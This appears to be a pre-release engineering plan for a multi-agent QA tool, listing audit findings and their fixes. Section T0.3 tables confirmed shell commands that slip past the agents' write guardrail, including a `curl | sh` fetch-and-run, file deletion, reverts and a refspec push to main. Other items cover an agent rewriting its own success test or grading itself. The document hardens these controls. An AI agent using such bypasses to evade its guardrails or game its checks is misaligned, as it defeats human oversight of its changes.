# 0.0.2 pre-release plan

Derived from a multi-agent audit of the whole tree (16 reviewers, 41 findings
adversarially verified, ~30 more verified by hand). Every item below cites the
code. Tick a box only when the change *and* its test have landed.

**Status: Tier 0, Tier 1, Tier 2A and Tier 2B are landed.** 915 tests pass,
`qaas validate` and `qaas run --mode pr-check --dry-run` are clean, and the wheel
installs and runs from a clean venv. What is still open is listed under "Deferred"
and "Tier 3" at the bottom — those are decisions, not omissions.

Gate before release, per CLAUDE.md:

```
pytest -q
qaas validate
qaas run --mode pr-check --dry-run
```

---

## Tier 0 — ship blockers

### T0.1 Every MCP tool error is delivered to the agent as a success
`src/qaas/mcp/context.py:73` returns `{"isError": True}`. The installed SDK
builds the wire result from `result.get("is_error", False)`
(`claude_agent_sdk/__init__.py:611`), so the key is dropped. Every `err()` from
all seven in-process servers — guardrail refusals, "you may not file", "not
reproducible" — reaches the model as a **successful** result. The self-correction
contract ("errors are returned, not raised, so the agent reads the reason and
corrects itself") has never worked.

- [x] `err()` returns `is_error` (keep `isError` alongside for MCP-spec readers)
- [x] Test drives a handler through the SDK's `run_tool`, not the raw dict

### T0.2 `protected_paths` is never populated, so FIXER may rewrite the defining test
No agent YAML sets `protected_paths` and neither does the router, so
`Guardrail._protected_path` always returns `False` and the `_check_bash`
protected branch is dead. `fixer.yaml:22` grants `write_paths: [api/app,
web/src, qa/repro]` — and `qa/repro` is REPRODUCER's sandbox, holding the failing
test `tasks.py` hands FIXER as "the test that defines success". §10's
symptom-fix guard is unenforced.

- [x] `Router._remediate` deep-copies the FIXER spec per invocation and sets
      `policy.protected_paths = [envelope.reproduction.failing_test]` (file part)
- [x] Test: FIXER is refused a write to the failing test, allowed elsewhere

### T0.3 Guardrail shell bypasses (8 confirmed, reproduced empirically)
`_writes_of` inspects only `parts[0]` and falls through to "writes nothing" for
everything it does not recognise — the documented invariant is the opposite
("a command that mutates and whose destination cannot be resolved is refused").

| command | today |
|---|---|
| `rm api/app/auth.py` | allowed — `FORBIDDEN_BASH` catches only `-r`/`-f`/`-R` |
| `echo $(rm api/app/auth.py)` | allowed — command substitution invisible |
| `find . -exec sed -i '' s/x/y/ {} +` | allowed — only `parts[0]` inspected |
| `xargs sed -i '' s/a/b/ < list` | allowed — same |
| `curl -sL http://x \| sh` | allowed — `sh` without `-c` is not a script runner |
| `sed --in-place s/x/y/ f.py` | allowed — `"--in-place".startswith("-i")` is False |
| `echo x >\| api/app/auth.py` | allowed — `_SEGMENT_RE` splits on the `\|` of `>\|` |
| `cp -t api/app /tmp/evil.py` | allowed — `-t` dest discarded as a flag value |
| `git checkout -- api/app/auth.py` | allowed — in neither `GIT_WRITE` nor `_writes_of` |
| `git push origin qa/x:main` | allowed — refspec bypasses the branch-pattern gate |
| `api/app/Auth.py` | allowed — `fnmatch` is case-sensitive, macOS is not |

- [x] Rewrite `_writes_of` on a `shlex` tokenizer, quote-aware segmentation
- [x] Peel wrappers: `env VAR=…`, `timeout`, `nice`, `nohup`, `command`, `xargs`
- [x] Refuse-when-undeterminable: `eval`, `find -exec/-delete`, `xargs`,
      command substitution, a pipe into any shell, `git clean`/`git stash`
- [x] Deletion and revert verbs are writes: `rm`, `git rm`, `git checkout -- P`,
      `git restore P`, `mv` **source** as well as destination
- [x] `sed --in-place[=SUF]`, `cp/mv/install -t DIR`, `>|`
- [x] `git push` refspec: refuse any argument containing `:` or leading `+`
- [x] Case-fold both sides in `_forbidden_class` and `_protected_path`
- [x] The whole table above lands as a parametrized bypass corpus

### T0.4 One malformed ledger line makes a run unreadable
`store.ledger()` calls `LedgerEntry.model_validate_json(line)` unguarded.
Verified: a truncated final line raises `ValidationError` out of `qaas show`,
`qaas trace` and every dashboard route. A killed run is exactly when the audit
trail matters most.

- [x] `ledger()` skips and counts unparseable lines; `strict=True` opts in
- [x] Test: a truncated trailing line still yields every good entry

### T0.5 Cross-run regression detection is dead code
`resolved_at` is the sole trigger for the REGRESSION path
(`defect_memory.py:383`). Its only writer is `mark_resolved`, and `grep` finds
that called **only in tests** — VERIFIER, the one agent that closes a ticket,
has no `defect_memory` server (`verifier.yaml:12`). No shipped roster can ever
report "this was fixed and came back".

- [x] Extract module-level `record_defect/resolve/search` from the tool closures
- [x] `Router._verify_loop` calls `resolve(...)` beside the existing
      `store.log("verified", ...)` — Python, not a new agent grant
- [x] Test: a VERIFIED ticket sets `resolved_at`; a later report is a REGRESSION

### T0.6 `memory.db` is not partitioned by target
`connect(ctx.store.root)` opens one `.qaas/memory.db`; the schema has no target
column; `search_similar` does `SELECT * FROM defects` unfiltered. `qaas run
--repo` puts every clone under that one state root, so one project's memory
answers another project's questions — and can suppress a real defect as
"already tracked as PROJ-N".

- [x] `target TEXT NOT NULL DEFAULT ''` + index, migrated in place by the
      existing `executescript` (`''` = legacy, still visible)
- [x] Filled from `ctx.config.target`; never a tool argument
- [x] `WHERE target IN (?, '')` in `search_similar` and `get_occurrences`

### T0.7 Stale wheel in `dist/`
`dist/qaas_python-0.0.2-*.whl` is dated before the dashboard-configuration
commits. Uploading it ships 0.0.2 without its headline feature.

- [x] `rm -rf dist && python -m build` as the last step before upload
- [x] CI asserts the wheel *contains* prompts, defaults and skills — today it
      only asserts it does not contain `target-app/`

### T0.8 `.env.example` contradicts the code on security routing
`.env.example:12` says security findings fall back to `JIRA_PROJECT_KEY`.
`mcp/tracker.py:177` refuses them instead. Filing a security finding publicly
has no undo.

- [x] Rewrite those three lines to match the code

---

## Tier 1 — the loop is a loop

### T1.1 `_latest_verdict` / `_latest_review` are unscoped
Both scan the whole run ledger and take the last entry for the ticket, unlike
`_branch_written_since`, which the team already learned to scope with a mark.
A VERIFIER that finishes without calling `record_verdict` — a normal path, since
the Stop hook lets an agent through after one block — silently inherits the
previous verdict. On a resumed run that is a VERIFIED nobody verified.

- [x] Mark before each dispatch; helpers take `since: int`
- [x] Test: a silent VERIFIER after a prior verdict escalates, not inherits

### T1.2 FIXER/REVIEWER is a retry, not a loop
`record_review` refuses REQUEST_CHANGES without `concerns` on the grounds that
"FIXER gets them verbatim" — and then `_latest_review` throws the reasoning away
and `tasks.fixer` has nowhere to put it. Round 2 is a byte-identical prompt.

- [x] Helpers return the whole `LedgerEntry`
- [x] `tasks.fixer(..., feedback=...)` renders "what the last attempt got wrong"
      from `verdict.detail["observed"]` and `review.detail` concerns
- [x] Test: the second FIXER task differs from the first and names the concern

### T1.3 `max_wall_clock_s` cannot preempt a hung agent
`Budget.check()` runs only *between* dispatches. `_dispatch` awaits `run_agent`
with no timeout, so one wedged Playwright session outlives the run's own clock.

- [x] `asyncio.wait_for` in `_dispatch`, deadline = remaining run clock
- [x] `TimeoutError` becomes a recorded agent failure, not a crash

### T1.4 A resumed run re-files every ticket
`_phase_file` re-selects every fileable envelope regardless of `jira.key`, and
`create_issue` never looks at it. `--from-board` resumes by design.

- [x] `_phase_file` filters `e.jira.key is None` and logs the skip count
- [x] Third belt in `mcp/tracker.py:create_issue`

### T1.5 Three dispatch paths have no `budget.check()`
The class docstring says "checked before every dispatch". `_phase_file`,
`_verify_loop`'s second and later iterations, and REVIEWER in `_remediate`
break it.

- [x] Add the three checks
- [ ] Test asserts the invariant across every phase of `full-loop` — the three
      checks are in; the monkeypatched invariant test is not

### T1.6 A crashed agent's spend is recorded as $0
`cost` is assigned only inside the `ResultMessage` branch. A drop at turn 60 of
FIXER's 80 tells the governor nothing was spent. On resume it compounds.

- [x] Conservative estimate with `cost_estimated: bool` on `AgentResult`
- [ ] `qaas show` and the dashboard mark it rather than presenting it as measured
      — the field is recorded; nothing renders it yet

### T1.7 No budget reserve: a timeout in discovery files nothing
`BudgetExceeded` unwinds to `run()`, skipping file, verify and report. The
envelopes are on disk and no ticket exists.

- [x] `RunMode.reserve_fraction: float = 0.15`
- [x] Discover/reproduce trip at the reserve; file/report run on the remainder

### T1.8 REPRODUCER fans out 2-wide over one shared working tree
Two invocations hold `vcs` and `env_control` against the same `target_root`.

- [x] `concurrency=1` (the cheap correct change; worktrees are a 0.0.3 idea)

### T1.9 Envelopes are credited to whichever agent finishes after them
`run_agent` diffs the whole store with no `discovered_by` filter.

- [x] Filter on `discovered_by == spec.name`

---

## Tier 2A — synthesis: the cross-domain blindness

Nothing joins two findings. An auth bypass provable only from API's "filters by
id, not org_id" plus DBA's "no owner constraint" is emitted as two sub-blocker
envelopes in two domains that `fingerprint()` guarantees hash differently — and
the DBA half, likely `minor`, is denied even a failing test by
`reproduce_min_severity: major`.

- [x] `Layer` gains `synthesis` (`config.py:25`)
- [x] `Router._phase_synthesize`, dispatched **by layer**, between discover and
      reproduce — so its output earns a failing test and a ticket like any other
- [x] `tasks.synthesis()`
- [x] `src/qaas/prompts/SYNTHESIZER.md` — its job is the join, never a fresh
      domain search: read every envelope, form conjunction hypotheses, open the
      two files, confirm before emitting
- [x] `src/qaas/defaults/config/agents/synthesizer.yaml`, in `nightly` and
      `full-loop` only
- [x] `ui/state.py` `PHASES` / `_LAYER_PHASE` learn the layer
- [x] Prompt fix — the split-and-drop instruction destroys the evidence at
      source: `DBA.md:57`, `LOAD.md:99`, `SOCKET.md:97`, `ARCHITECT.md:79` gain
      "name the other surface and put the file you read it in into
      `location.paths`", which gives any later join a key
- [x] `EMIT_SCHEMA`'s `similar_to` admits envelope ids from this run
- [x] Log the orphaning of reporting-phase envelopes rather than pretending it
      does not happen

## Tier 2B — the learning loop

Nothing a run learns survives it. The scorecard is computed and discarded at all
three call sites. Held findings, REQUEST_CHANGES and NOT_FIXED are ledger lines
read back *within* the run and never after.

Design rule: **every write is made by Python, from outside an agent's turn.**
An agent that can write its own outcome can inflate its own precision — the same
failure mode as an agent editing the golden ledger.

- [x] `outcomes` table: `(fingerprint, target, run_id, at, outcome, agent, detail)`
      — `verified | not_fixed | regressed | review_rejected | held | not_reproducible`
- [x] Written only by `Router._record_outcomes(store)`, once, before
      `run_finished`
- [x] Surfaced through `search_similar` as a distinct line, never as a new tool
- [x] `false_positives` table, written only by `cli.score` / `cli.sweep` from
      `card.regressions_on_planted` — a process with no agent in it
- [x] `Scorecard.by_agent(envelopes)` — per-agent precision is one join away
      (`Match.envelope_id` × `discovered_by`) and is currently uncomputed
- [x] Persist each scoring to `.qaas/scores/<run_id>.json`
- [x] **Explicitly not built:** automatic confidence-threshold feedback.
      `confidence` is written by the discovering agent; any rule of the form
      "agent X has been reliable, lower X's gate" is an agent grading itself.
      Measure it, print it, and require a human to write `overrides.yaml`.

---

## Deferred to 0.0.3 (recorded so it is a decision, not an omission)

- `src/qaas/importgraph.py` — stdlib `ast` reverse-import closure behind
  `affected_tests`, current heuristic as fallback. This is the real correctness
  lever in the verify loop: `_score_tests` scores only textual co-occurrence of
  the changed file's *stem*, so a test reaching the changed module through a
  caller scores 0 — exactly the case `regression-suite-selection/SKILL.md:20`
  tells VERIFIER to cover.
- Verifying MAPPER's `routes` against `contract_diff._operations`.
- Router retries / dead-letter queue. Four documents promise it and it does not
  exist; either build the narrow version or delete the claim.
- Bounded second discovery pass (`RunMode.discovery_passes`), loop-until-dry.
- **Not building:** a symbol-level fingerprint. `normalize_path` already strips
  line numbers, so code motion within a file already hashes identically; adding
  the enclosing symbol makes identity *more* brittle under rename and cannot
  move any number `qaas score` measures.

## Tier 3 — carried, not lost

~30 further verified findings (scorecard anchor weights clearing the match
threshold on zero keyword overlap; `--config` collapsing the layered search;
`env_control` never checking `environment.mode` before `reset`/`tear_down`;
dashboard CSRF and DNS rebinding; `.env` resolved from the cwd; target-repo
subprocesses inheriting the credential-bearing environment; five test-quality
gaps). Tracked in the audit transcript; triaged after Tier 2 lands.
